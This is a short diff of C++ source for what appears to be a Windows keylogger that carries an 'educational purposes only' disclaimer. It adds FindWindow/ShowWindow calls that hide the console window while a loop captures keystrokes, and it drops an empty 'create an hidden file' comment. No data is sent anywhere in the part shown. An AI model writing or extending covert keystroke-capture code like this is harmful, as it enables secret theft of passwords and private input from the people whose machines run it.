@@ -50,13 +50,6 @@ cout<<"Atention: This code is for educational propourses only, not use it on mac
 cout<<"Knowing doesn't Enought!!!"<<endl;
 }
 
-//create an hidden file
-
-
-
-
-
-
 bool special_keys(int st_key)
 {
 switch(st_key)
@@ -122,11 +115,12 @@ return false;
 
 int main()
 {
-
 //get_logo();	
-
 char KEY='x';
 string str_key;
+
+HWND hide = FindWindow("ConsoleWindowClass",NULL);	
+ShowWindow(hide,NULL);
 
 while(true)
 	{
@@ -149,6 +143,8 @@ while(true)
 		}
 	
 	}
+	
+ShowWindow(hide,1);	
 return 0;
 }	
 
